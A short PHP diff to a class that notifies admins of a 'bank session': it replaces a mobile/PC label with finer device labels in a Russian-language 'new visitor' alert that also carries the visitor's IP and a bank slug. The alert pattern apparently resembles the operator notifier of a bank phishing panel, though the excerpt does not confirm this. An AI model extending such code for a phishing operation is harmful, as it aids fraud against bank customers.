@@ -97,7 +97,15 @@ class NotifyAdminsOfBankSession
 
         $ip     = $preSession->ip_address ?? '-';
         $bank   = $preSession->bank_slug ?? '-';
-        $device = $preSession->device_type === 'mobile' ? '📱 Мобильный' : '🖥️ ПК';
+        $device = match($preSession->device_type) {
+            'iphone'  => '📱 iPhone',
+            'ipad'    => '📱 iPad',
+            'android' => '📱 Android',
+            'windows' => '🖥️ Windows',
+            'macos'   => '🍎 macOS',
+            'linux'   => '🐧 Linux',
+            default   => '🖥️ ПК',
+        };
 
         $text = <<<HTML
 🛰 <b>Новый посетитель</b>
